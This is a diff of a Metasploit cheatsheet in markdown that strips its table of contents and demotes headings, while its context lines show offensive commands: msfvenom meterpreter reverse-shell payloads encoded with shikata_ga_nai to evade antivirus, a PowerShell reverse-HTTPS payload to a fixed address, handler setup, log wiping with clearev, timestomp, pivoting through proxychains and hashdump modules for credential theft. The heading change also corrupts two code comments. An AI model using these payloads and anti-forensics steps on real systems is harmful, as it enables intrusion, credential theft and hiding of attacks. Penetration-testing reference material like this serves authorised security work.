@@ -1,53 +1,6 @@
-# Metasploit
+# Metasploit Cheatsheet
 ---
-## Navigation
-- [**Basic Commands**](#basic-commands)
-- [**Commands from a file**](#commands-from-a-file)
-- [**Information Gathering**](#information-gathering)
-	- [Port Scanning](#port-scanning)
-	- [Backup files from websites](#backup-files-from-websites)
-	- [Directory listing test](#directory-listing-test)
-	- [SSL testing](#ssl-testing)
-	- [SSH kippo detection](#ssh-kippo-detection)
-	- [Domain Name System](#domain-name-system)
-	- [Remote Desktop protocol](#remote-desktop-protocol)
-	- [Password Sniffing](#password-sniffing)
-	- [Shodan qeuries](#shodan-qeuries) 
-- **[Vulnerability Hunting](#vulnerability-hunting)**
-	- [Managing the database](#managing-the-database) 
-	- [Importing scans](#importing-scans)
-	- [Backing up the database](#backing-up-the-database)
-	- [NMAP](#nmap)
-	- [Nessus](#nessus)
-	- [msf utilities](#msf-utilities)
-- **[Client-Side attacks](#client-side-attacks)** 
-	- [Msfvenom](#msfvenom)
-	- [Listeners](#listeners) 
-- **[Antivirus Evasion and Anti-Forensics](#antivirus-evasion-and-anti-forensics)**
-	- **[Using encoders](#using-encoders)**
-		- [shikata_ga_nai encoder](#shikata-ga-nai-encoder)
-		- [opt_sub encoder](#opt-sub-encoder)
-	- **[Using the new evasion modules](#using-the-new-evasion-modules)**
-		- [windows_defender_exe](#windows-defender-exe)
-	- **[Using packagers and encrypters](#using-packagers-and-encrypters)**
-		- [Using 7-zip utility](#using-7-zip-utility) 
-	- **[Understanding what a sandbox is](#understanding-what-a-sandbox-is)**
-		- [Using Metasploit for anti-forensics](#using-metasploit-for-anti-forensics)
-			- [Timestomp](#timestomp)
-			- [Clearev](#clearev)
-- **[Armitage](#armitage)** 
-	- [Scanning and enumeration](#scanning-and-enumeration)
-	- [Finding and launching attacks](#finding-and-launching-attacks)
-- [**Shell-Over-Wan**](#shell-over-wan)
-- **[Importing scans](#importing-scans)** 
-- **[Pivoting](#pivoting)**
-	- [Adding a route](#adding-a-route)
-	- [Metasploit](#metasploit)
-- **[Post-exploitation](#post-exploitation)**
-- **[Powershell](#powershell)**
-- **[Further learning](#further-learning)**
----
-# Basic-Commands
+## Basic-Commands
  - **Version**: Display version.
  - **Connect <IP:PORT>**: Works like Netcat.
  - **Help**: Display help :).
@@ -65,7 +18,7 @@
  - **Set**&**unset**: For setting and unsetting variables.
  - **Setg**&**unsetg**: For setting and unsetting global variables.
 
-# Commands-from-a-file
+## Commands-from-a-file
 Put the commands in a file
 ```
 use <MODULE>
@@ -76,7 +29,7 @@ Then
 ```
 msfconsole -r <FILE>
 ```
-# Information-Gathering
+## Information-Gathering
 ## Port-scanning
 ```txt
 auxiliary/scanner/portscan/tcp
@@ -126,7 +79,7 @@ auxiliary/sniffer/psnuffle
 auxiliary/gather/shodan_search
 ```
 ---
-# Vulnerability-Hunting
+## Vulnerability-Hunting
 ## Managing-the-database
 ```bash
 service postgresql start
@@ -207,7 +160,7 @@ msf-makeiplist -i <FILE>
 etc..
 ```
 ---
-# Client-Side-attacks
+## Client-Side-attacks
 - The attacker hosts a website with the required malicious payload and sends it to the victim.
 - The attacker sends the payload embedded in any innocent-looking file, such as a DOC, PDF, or XLS, to the victim over email.
 - The attacker sends the payload using an infected media drive (such as a USB flash drive, CD, or DVD).
@@ -244,14 +197,14 @@ meterpreter/reverse_tcp; set LHOST <IP>; set LPORT
 <PORT>; run; exit -y"
 ```
 ---
-# Antivirus-Evasion-Anti-Forensics
+## Antivirus-Evasion-Anti-Forensics
 ## Using-Encoders
 ### shikata_ga_nai_encoder
 This is not the best way to evade a modern AV because it's easilty detected even after multiple encoding iterations. 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -e x86/shikata_ga_nai -i 5 -f exe -O ./reverse.exe
 
-# -i ,iterations
+## -i ,iterations
 ```
 ### opt_sub-encoder
 This is slightly better than shikata_ga_nai but overall not the best option for a real-life engagement.
@@ -311,7 +264,7 @@ Use `clearev`  to wipe out all the logs and clear our activity trails.
 clearev
 ```
 ---
-# Armitage
+## Armitage
 To start Armitage:
 ```bash
 #Start postgresql
@@ -349,7 +302,7 @@ option.
  - http://www.fastandeasyhacking.com/
 
 ---
-# Shell-Over-Wan
+## Shell-Over-Wan
 ```
 msfconsole  
 use exploit/multi/handler  
@@ -360,14 +313,14 @@ set ReverseListeningBindAddress localhost
 set ReverseListeningBindPort 8080  
 exploit
 ```
-# Importing-external-exploits
+## Importing-external-exploits
 1. Download the exploit.rb code.
 2. Put it in the appropriate path `/usr/share/metasploit-framework/modules/PATH`
 > Important Note
 The path shown in the screenshot is the default path of the Metasploit Framework, which comes pre-installed on Kali Linux. You need to  change the path if you have a custom installation of the Metasploit Framework.
 3. After copying the newly downloaded exploit code to the Metasploit directory, we will start msfconsole and issue a reload_all command to reload the internal DB.
 ---
-# Pivoting
+## Pivoting
 ## Adding a route
 In a meterpreter shell
 ```bash
@@ -397,13 +350,13 @@ proxychains <Command>
 proxychains nmap -A -Pn -T4 127.0.0.1
 ```
 ---
-# Post-exploitation
+## Post-exploitation
 ## Windows-based systems
 **Run commands from meterpreter shell**
 ```
 execute -f <COMMAND> -a <ARGS>
 execute -f "cmd.exe" -a "/c"
-# To get the output
+## To get the output
 execute -f "whoami" -a "/all" -i
 ```
 
@@ -495,7 +448,7 @@ run post/osx/gather/hashdump
 run post/linux/gather/hashdump
 ```
 ---
-# Powershell
+## Powershell
 PowerShell payload formats
 1. **psh**
 2. **psh-cmd**
@@ -518,5 +471,5 @@ PowerShell payload formats
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 -f psh-reflection > ps.ps1
 ```
 ---
-# Further learning
+## Further learning
 - [https://www.offensive-security.com/metasploit-unleashed/](https://www.offensive-security.com/metasploit-unleashed/)
